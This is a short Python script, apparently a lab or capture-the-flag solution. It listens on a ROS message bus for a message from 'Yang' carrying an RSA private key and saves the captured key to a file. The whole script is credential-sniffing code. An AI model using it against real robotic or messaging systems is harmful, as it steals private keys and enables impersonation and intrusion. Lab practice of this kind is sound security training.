#!/usr/bin/python3
"""Capture the private key leaked on the lab's ROS messagebus."""
import rospy
from yang.msg import Comms


def on_message(message):
    if message.sender != "Yang" or not message.actionparams:
        return
    value = message.actionparams[0]
    if "BEGIN RSA PRIVATE KEY" in value:
        path = "/home/yang/yang-privkey.pem"
        with open(path, "w", encoding="ascii") as output:
            output.write(value)
            output.write("\n")
        print(path)
        rospy.signal_shutdown("key captured")


rospy.init_node("sidequest_capture", anonymous=True)
rospy.Subscriber("messagebus", Comms, on_message)
rospy.spin()
